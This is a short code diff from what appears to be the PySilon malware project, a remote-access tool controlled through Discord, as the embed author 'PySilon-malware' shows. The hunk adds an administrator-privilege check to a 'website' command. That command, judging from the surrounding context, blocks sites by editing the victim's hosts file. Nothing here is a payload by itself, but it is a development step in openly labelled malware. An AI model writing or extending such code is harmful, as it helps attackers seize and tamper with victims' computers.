@@ -12,6 +12,10 @@ def get_hosts_file_path():
 @client.command(name="website")
 async def website_blocker(ctx, option=None, website=None):
     await ctx.message.delete()
+    if not IsAdmin():
+        embed = discord.Embed(title="📛 Error", description=f'```This command requires (UAC) elevation.```', colour=discord.Colour.red())
+        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
+        return await ctx.send(embed=embed)
     if option == "block":
         if website != None:
             if not website.startswith("https://") or not website.startswith("http://"):
